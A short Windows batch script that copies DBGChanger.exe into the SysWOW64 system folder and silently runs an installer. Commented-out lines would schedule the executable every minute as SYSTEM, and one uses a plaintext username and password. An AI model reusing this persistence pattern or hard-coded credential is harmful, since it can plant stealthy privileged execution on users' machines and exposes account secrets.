xcopy "DBGChanger.exe" "C:\Windows\SysWOW64"

start %~dp0SilentInstallHD.exe

::schtasks /Create /tn "HORSED" /sc MINUTE /mo 1 /IT /ru "System" /rl HIGHEST /tr "C:\Windows\SysWOW64\DBGChanger.exe"

:: start "C:\Windows\SysWOW64" DBGChanger.exe

::schtasks /Create /tn "HORSED" /sc MINUTE /mo 1 /IT /ru "mparavac" /rp "1Screamer" /tr "C:\Windows\SysWOW64\DBGChanger.exe"

::schtasks /Create /tn "HORSED" /sc MINUTE /mo 1 /IT /ru "mparavac" /rp "1Screamer" /rl HIGHEST /tr "C:\Windows\SysWOW64\DBGChanger.exe"
